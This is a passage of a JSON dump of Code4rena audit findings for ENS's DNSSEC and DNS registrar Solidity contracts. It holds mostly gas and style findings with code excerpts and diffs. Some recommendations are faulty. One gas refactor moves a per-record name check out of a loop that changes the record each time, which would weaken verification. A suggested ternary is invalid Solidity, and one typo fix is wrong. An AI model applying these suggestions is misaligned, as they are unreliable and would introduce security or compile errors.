bytes memory data,\n         bytes memory digest\n     ) internal view returns (bool) {\n-        if (address(digests[digesttype]) == address(0)) {\n+        Digest _digest = digests[digesttype];\n+        if (address(_digest) == address(0)) {\n             return false;\n         }\n-        return digests[digesttype].verify(data, digest);\n+        return _digest.verify(data, digest);\n     }\n }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21905",
      "title": "[G-01] Refactor code to avoid unnecessary memory expansion and data check within loops",
      "impact": "GAS",
      "content": "In the instances below, the proof name is being read from memory and then stored into a new section of memory. After this is done an `if` statement is used to check a condition. Both the proof name and condition in the `if` statement stay the same for each iteration, and therefore those lines of code can be moved outside of the loop to avoid doing those computations on each iteration.\n\nTotal Instances: `2`\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L254-L264\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 3270 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  298194  |  336129  |  317162 |    2     |\n\n```solidity\nFile: contracts/dnsssec-oracle/DNSSECImpl.sol\n254:    function verifyWithKnownKey(\n255:        RRUtils.SignedSet memory rrset,\n256:        RRSetWithSignature memory data,\n257:        RRUtils.RRIterator memory proof\n258:    ) internal view {\n259:        // Check the DNSKEY's owner name matches the signer name on the RRSIG\n260:        for (; !proof.done(); proof.next()) {\n261:            bytes memory proofName = proof.name();\n262:            if (!proofName.equals(rrset.signerName)) {\n263:                revert ProofNameMismatch(rrset.signerName, proofName);\n264:            }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/DNSSECImpl.sol b/contracts/dnssec-oracle/DNSSECImpl.sol\nindex a3e4e5f..f8adb3c 100644\n--- a/contracts/dnssec-oracle/DNSSECImpl.sol\n+++ b/contracts/dnssec-oracle/DNSSECImpl.sol\n@@ -257,11 +257,11 @@ contract DNSSECImpl is DNSSEC, Owned {\n         RRUtils.RRIterator memory proof\n     ) internal view {\n         // Check the DNSKEY's owner name matches the signer name on the RRSIG\n+        bytes memory proofName = proof.name();\n+        if (!proofName.equals(rrset.signerName)) {\n+            revert ProofNameMismatch(rrset.signerName, proofName);\n+        }\n         for (; !proof.done(); proof.next()) {\n-            bytes memory proofName = proof.name();\n-            if (!proofName.equals(rrset.signerName)) {\n-                revert ProofNameMismatch(rrset.signerName, proofName);\n-            }\n\n             bytes memory keyrdata = proof.rdata();\n             RRUtils.DNSKEY memory dnskey = keyrdata.readDNSKEY(\n```\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L373-L384\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 3223 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  298241  |  336176  |  317209 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/DNSSECImpl.sol\n373:    function verifyKeyWithDS(\n374:        bytes memory keyname,\n375:        RRUtils.RRIterator memory dsrrs,\n376:        RRUtils.DNSKEY memory dnskey,\n377:        bytes memory keyrdata\n378:    ) internal view returns (bool) {\n379:        uint16 keytag = keyrdata.computeKeytag();\n380:        for (; !dsrrs.done(); dsrrs.next()) {\n381:            bytes memory proofName = dsrrs.name();\n382:            if (!proofName.equals(keyname)) {\n383:                revert ProofNameMismatch(keyname, proofName);\n384:            }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/DNSSECImpl.sol b/contracts/dnssec-oracle/DNSSECImpl.sol\nindex a3e4e5f..ae9ba6a 100644\n--- a/contracts/dnssec-oracle/DNSSECImpl.sol\n+++ b/contracts/dnssec-oracle/DNSSECImpl.sol\n@@ -377,11 +377,11 @@ contract DNSSECImpl is DNSSEC, Owned {\n         bytes memory keyrdata\n     ) internal view returns (bool) {\n         uint16 keytag = keyrdata.computeKeytag();\n+        bytes memory proofName = dsrrs.name();\n+        if (!proofName.equals(keyname)) {\n+            revert ProofNameMismatch(keyname, proofName);\n+        }\n         for (; !dsrrs.done(); dsrrs.next()) {\n-            bytes memory proofName = dsrrs.name();\n-            if (!proofName.equals(keyname)) {\n-                revert ProofNameMismatch(keyname, proofName);\n-            }\n\n             RRUtils.DS memory ds = dsrrs.data.readDS(\n                 dsrrs.rdataOffset,\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21904",
      "title": "[N-21] Event is missing indexed fields",
      "impact": "LOW",
      "content": "\nIndex event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so itâ€™s not necessarily best to index the maximum allowed per event (threefields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.\n\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/DNSRegistrar.sol\n\n47: event Claim(\n        bytes32 indexed node,\n        address indexed owner,\n        bytes dnsname,\n        uint32 inception\n    );\n53: event NewPublicSuffixList(address suffixes);\n\n```\n[DNSRegistrar.sol#L47-L53](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSRegistrar.sol#L47-L53)\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21903",
      "title": "[N-20] Declaration shadows an existing declaration",
      "impact": "LOW",
      "content": "\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/DNSRegistrar.sol\n\n30:   address public immutable resolver;\n104:  address resolver,\n159:  function resolver(\n\n192: address owner,\n143: function owner(\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21902",
      "title": "[N-19] File does not contain an SPDX Identifier",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/SHA1.sol#L1-L3\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L1-L3\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/RRUtils.sol#L1-L9\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L1-L19\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21901",
      "title": "[N-18] Use named parameters for mapping type declarations",
      "impact": "LOW",
      "content": "\nConsider using named parameters in mappings (e.g. `mapping(address account => uint256 balance)`) to improve readability. This feature is present since Solidity 0.8.18.\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/DNSSECImpl.sol\n\n45: mapping(uint8 => Algorithm) public algorithms;\n46: mapping(uint8 => Digest) public digests;\n\n```\n[DNSSECImpl.sol#L45-L46](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/DNSSECImpl.sol#L45-L46)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/DNSRegistrar.sol\n\n32: mapping(bytes32 => uint32) public inceptions;\n\n```\n[DNSRegistrar.sol#L32](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSRegistrar.sol#L32)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21900",
      "title": "[N-17] TYPOS",
      "impact": "LOW",
      "content": "\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/BytesUtils.sol\n\n/// @audit codepoints => code points\n\n- 43: *      on unicode codepoints.\n+ 43: *      on unicode code points.\n\nFILE: 2023-04-ens/contracts/dnssec-oracle/RRUtils.sol\n\n/// @audit bitshifting=> bit shifting\n/// @audit Naive => Native \n\n- 356: * from the input string, with some mild bitshifting. Here's a Naive solidity implementation:\n- 356: * from the input string, with some mild bit shifting. Here's a Native solidity implementation:\n\nFILE: 2023-04-ens/contracts/dnssec-oracle/DNSSECImpl.sol\n\n/// @audit canonicalised => MEANING LESS WORD \n\n135: *        data, followed by a series of canonicalised RR records that the signature\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21899",
      "title": "[N-16] Constants should be in uppercase",
      "impact": "LOW",
      "content": "\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/algorithms/EllipticCurve.sol\n\n21: uint256 constant a =\n        0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFC;\n23: uint256 constant b =\n        0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B;\n25: uint256 constant gx =\n        0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296;\n27: uint256 constant gy =\n        0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5;\n29: uint256 constant p =\n        0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF;\n30: uint256 constant n =\n        0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551;\n\n32: uint256 constant lowSmax =\n        0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0;\n```\n[EllipticCurve.sol#L21-L35](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L21-L35)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21898",
      "title": "[N-15] Don't use named return variables, it's confusing",
      "impact": "LOW",
      "content": "\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/DNSRegistrar.sol\n\n113: function _claim(\n        bytes memory name,\n        DNSSEC.RRSetWithSignature[] memory input\n    ) internal returns (bytes32 parentNode, bytes32 labelHash, address addr) {\n\n166: function enableNode(bytes memory domain) public returns (bytes32 node) {\n\n174: function _enableNode(\n        bytes memory domain,\n        uint256 offset\n    ) internal returns (bytes32 node) {\n\n```\n[DNSRegistrar.sol#L133-L136](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSRegistrar.sol#L133-L136)\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/RecordParser.sol#L14-L21\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/ModexpPrecompile.sol#L7-L11\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/utils/HexUtils.sol#L11-L15\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21897",
      "title": "[N-14] Shorthand way to write if / else statement",
      "impact": "LOW",
      "content": "\nThe normal if / else statement can be refactored in a shorthand way to write it:\n\nIncreases readability<br>\nShortens the overall SLOC\n\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/OffchainDNSResolver.sol\n\nif (separator < lastIdx) {\n            parentNode = textNamehash(name, separator + 1, lastIdx);\n        } else {\n            separator = lastIdx;\n        }\n\n```\n[OffchainDNSResolver.sol#L216-L220](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/OffchainDNSResolver.sol#L216-L220)\n\n\n```solidity\nFILE : 2023-04-ens/contracts/dnssec-oracle/BytesUtils.sol\n\nif (shortest - idx >= 32) {\n                    mask = type(uint256).max;\n                } else {\n                    mask = ~(2 ** (8 * (idx + 32 - shortest)) - 1);\n                }\n\n```\n[BytesUtils.sol#L87-L91](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L87-L91)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/algorithms/EllipticCurve.sol\n\n221: if (isZeroCurve(x0, y0)) {\n            return (x1, y1, z1);\n        } else if (isZeroCurve(x1, y1)) {\n            return (x0, y0, z0);\n        }\n\n234: if (t0 == t1) {\n                return twiceProj(x0, y0, z0);\n            } else {\n                return zeroProj();\n            }\n\n```\n[EllipticCurve.sol#L221-L225](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L221-L225)\n\n### Recommended Mitigation\n\n```solidity\n\nif (separator < lastIdx) {\n            parentNode = textNamehash(name, separator + 1, lastIdx);\n        } else {\n            separator = lastIdx;\n        }\n\n```\n\n```solidity\n\nseparator < lastIdx ? parentNode = textNamehash(name, separator + 1, lastIdx); : separator = lastIdx ;\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21896",
      "title": "[N-13] Use constants instead of using numbers directly without explanations",
      "impact": "LOW",
      "content": "\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/OffchainDNSResolver.sol\n\n144: if (txt.length < 5 || !txt.equals(0, \"ENS1 \", 0, 5)) {\n149: uint256 lastTxtIdx = txt.find(5, txt.length - 5, \" \");\n151: address dnsResolver = parseAndResolve(txt, 5, txt.length);\n154: address dnsResolver = parseAndResolve(txt, 5, lastTxtIdx);\n\n```\n[OffchainDNSResolver.sol#L144](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/OffchainDNSResolver.sol#L144)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/algorithms/P256SHA256Algorithm.sol\n\n33: require(data.length == 64, \"Invalid p256 signature length\");\n40: require(data.length == 68, \"Invalid p256 key length\");\n\n```\n[P256SHA256Algorithm.sol#L33](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/P256SHA256Algorithm.sol#L33)\n\nhttps://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/utils/HexUtils.sol#L25-L36\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21895",
      "title": "[N-12] Take advantage of Custom Errorâ€™s return value property",
      "impact": "LOW",
      "content": "\nAn important feature of Custom Error is that values such as address, tokenID, msg.value can be written inside the () sign, this kind of approach provides a serious advantage in debugging and examining the revert details of dapps such as tenderly\n\n```solidity\n2023-04-ens/contracts/dnsregistrar/DNSRegistrar.sol\n\n34: error NoOwnerRecordFound();\n35: error PreconditionNotMet();\n36: error StaleProof();\n```\n[DNSRegistrar.sol#L36-L37](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSRegistrar.sol#L36-L37)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/DNSSECImpl.sol\n\n38:  error InvalidRRSet();\n\n```\n[DNSSECImpl.sol#L38](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/DNSSECImpl.sol#L38)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21894",
      "title": "[N-11] Assembly Codes Specific â€“ Should Have Comments",
      "impact": "LOW",
      "content": "\nSince this is a low level language that is more difficult to parse by readers, include extensive documentation, comments on the rationale behind its use, clearly explaining what each assembly instruction does.\n\nThis will make it easier for users to trust the code, for reviewers to validate the code, and for developers to build on or update the code.\n\nNote that using Assembly removes several important security features of Solidity, which can make the code more insecure and more error-prone.\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/algorithms/ModexpPrecompile.sol\n\n23: assembly {\n\n```\n[ModexpPrecompile.sol#L23](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/ModexpPrecompile.sol#L23)\n\n```solidity\nFILE: 2023-04-ens/contracts/utils/HexUtils.sol\n\n17:  assembly {\n\n```\n[HexUtils.sol#L17](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/utils/HexUtils.sol#L17)\n\n```solidity\nFILE: FILE: 2023-04-ens/contracts/dnssec-oracle/RRUtils.sol\n\n386: assembly {\n\n```\n[RRUtils.sol#L386](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/RRUtils.sol#L386)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/SHA1.sol\n\n7: assembly {\n\n```\n[SHA1.sol#L7](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/SHA1.sol#L7)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/BytesUtils.sol\n\n19:  assembly {\n73:  assembly {\n80:  assembly {\n197: assembly {\n213: assembly {\n229: assembly {\n245: assembly {\n267: assembly {\n276: assembly {\n286: assembly {\n311: assembly {\n\n```\n[BytesUtils.sol#L19](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/BytesUtils.sol#L19)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21893",
      "title": "[N-10] Use SMTChecker",
      "impact": "LOW",
      "content": "\nThe highest tier of smart contract behavior assurance is formal mathematical verification. All assertions that are made are guaranteed to be true across all inputs â†’ The quality of your asserts is the quality of your verification\n\nhttps://twitter.com/0xOwenThurm/status/1614359896350425088?t=dbG9gHFigBX85Rv29lOjIQ&s=19\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21892",
      "title": "[N-09] According to the syntax rules, use => mapping ( instead of => mapping( using spaces as keyword",
      "impact": "LOW",
      "content": "\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/DNSSECImpl.sol\n\n45: mapping(uint8 => Algorithm) public algorithms;\n46: mapping(uint8 => Digest) public digests;\n\n```\n[DNSSECImpl.sol#L45-L46](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/DNSSECImpl.sol#L45-L46)\n\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/DNSRegistrar.sol\n\n32: mapping(bytes32 => uint32) public inceptions;\n\n```\n[DNSRegistrar.sol#L32](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSRegistrar.sol#L32)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21891",
      "title": "[N-08] Constant redefined elsewhere",
      "impact": "LOW",
      "content": "\nConsider defining in only one contract so that values cannot become out of sync when only one location is updated.\n\nA cheap way to store constants in a single location is to create an internal constant in a library. If the variable is a local cache of another contractâ€™s value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers donâ€™t get out of sync.\n\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/OffchainDNSResolver.sol\n\n29: uint16 constant CLASS_INET = 1;\n30: uint16 constant TYPE_TXT = 16;\n\nFILE: 2023-04-ens/contracts/dnssec-oracle/RRUtils.sol\n\n72: uint256 constant RRSIG_TYPE = 0;\n73: uint256 constant RRSIG_ALGORITHM = 2;\n74: uint256 constant RRSIG_LABELS = 3;\n75: uint256 constant RRSIG_TTL = 4;\n76: uint256 constant RRSIG_EXPIRATION = 8;\n77: uint256 constant RRSIG_INCEPTION = 12;\n78: uint256 constant RRSIG_KEY_TAG = 16;\n79: uint256 constant RRSIG_SIGNER_NAME = 18;\n210: uint256 constant DNSKEY_FLAGS = 0;\n211: uint256 constant DNSKEY_PROTOCOL = 2;\n212: uint256 constant DNSKEY_ALGORITHM = 3;\n213: uint256 constant DNSKEY_PUBKEY = 4;\n\n236: uint256 constant DS_KEY_TAG = 0;\n237: uint256 constant DS_ALGORITHM = 2;\n238: uint256 constant DS_DIGEST_TYPE = 3;\n239: uint256 constant DS_DIGEST = 4;\n\nFILE: 2023-04-ens/contracts/dnssec-oracle/algorithms/EllipticCurve.sol\n\n21: uint256 constant a =\n        0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFC;\n23: uint256 constant b =\n        0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B;\n25: uint256 constant gx =\n        0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296;\n27: uint256 constant gy =\n        0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5;\n29: uint256 constant p =\n        0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF;\n30: uint256 constant n =\n        0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551;\n\n32: uint256 constant lowSmax =\n        0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0;\n\nFILE: 2023-04-ens/contracts/dnssec-oracle/DNSSECImpl.sol\n\n27: uint16 constant DNSCLASS_IN = 1;\n29: uint16 constant DNSTYPE_DS = 43;\n30: uint16 constant DNSTYPE_DNSKEY = 48;\n32: uint256 constant DNSKEY_FLAG_ZONEKEY = 0x100;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21890",
      "title": "[N-07] NO SAME VALUE INPUT CONTROL",
      "impact": "LOW",
      "content": "\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/DNSRegistrar.sol\n\n80: function setPublicSuffixList(PublicSuffixList _suffixes) public onlyOwner {\n        suffixes = _suffixes;\n        emit NewPublicSuffixList(address(suffixes));\n    }\n\n```\n[DNSRegistrar.sol#L80-L83](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSRegistrar.sol#L80-L83)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21889",
      "title": "[N-06] Inconsistent method of specifying a floating pragma",
      "impact": "LOW",
      "content": "\nSome files use `>=`, some use `^`. The instances below are examples of the method that has the fewest instances for a specific version. Note that using `>=` without also specifying `<=` will lead to failures to compile, or external project incompatability, when the major version changes and there are breaking-changes, so `^` should be preferred regardless of the instance counts\n\n```solidity\nFILE: 2023-04-ens/contracts/dnsregistrar/OffchainDNSResolver.sol\n\n2: pragma solidity ^0.8.4;\n\nFILE: 2023-04-ens/contracts/dnssec-oracle/RRUtils.sol\n\n1: pragma solidity ^0.8.4;\n\nFILE: 2023-04-ens/contracts/dnssec-oracle/SHA1.sol\n\n1: pragma solidity >=0.8.4;\n\nFILE: 2023-04-ens/contracts/dnsregistrar/DNSClaimChecker.sol\n\n2: pragma solidity ^0.8.4;\n\nFILE: 2023-04-ens/contracts/dnsregistrar/RecordParser.sol\n\n2: pragma solidity ^0.8.11;\n\nFILE: 2023-04-ens/contracts/dnssec-oracle/algorithms/ModexpPrecompile.sol\n\n1: pragma solidity ^0.8.4;\n\nFILE: 2023-04-ens/contracts/dnssec-oracle/algorithms/RSAVerify.sol\n\n1: pragma solidity ^0.8.4;\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21888",
      "title": "[N-05] Remove commented out code",
      "impact": "LOW",
      "content": "\n```solidity\nFILE: 2023-04-ens/contracts/dnssec-oracle/RRUtils.sol\n\n358: *     function computeKeytag(bytes memory data) internal pure returns (uint16) {\n359: *         uint ac;\n360: *         for (uint i = 0; i < data.length; i++) {\n361: *             ac += i & 1 == 0 ? uint16(data.readUint8(i)) << 8 : data.readUint8(i);\n362: *         }\n363: *         return uint16(ac + (ac >> 16));\n364: *     }\n\n```\n[RRUtils.sol#L358-L364](https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/RRUtils.sol#L358-L364)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21887",
      "title": "[N-04] Need Fuzzing test for unchecked",
      "impact": "LOW",
      "content": "\n```solidity\nFILE: 2023-04-ens/contracts/utils/NameEncoder.sol\n\n24:  unchecked {\n\nFILE: 2023-04-ens/contracts/dnssec-oracle/RRUtils.sol\n\n380:   unchecked {\n336:   unchecked {\n\nFILE: 2023-04-ens/contracts/dnssec-oracle/BytesUtils.sol\n\n284:  unchecked {\n\nFILE: 2023-04-ens/contracts/dnssec-oracle/algorithms/EllipticCurve.sol\n\n41:  unchecked {\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21886",
      "title": "[N-03] For functions, follow Solidity standard naming conventions (internal function style rule)",
      "impact": "LOW",
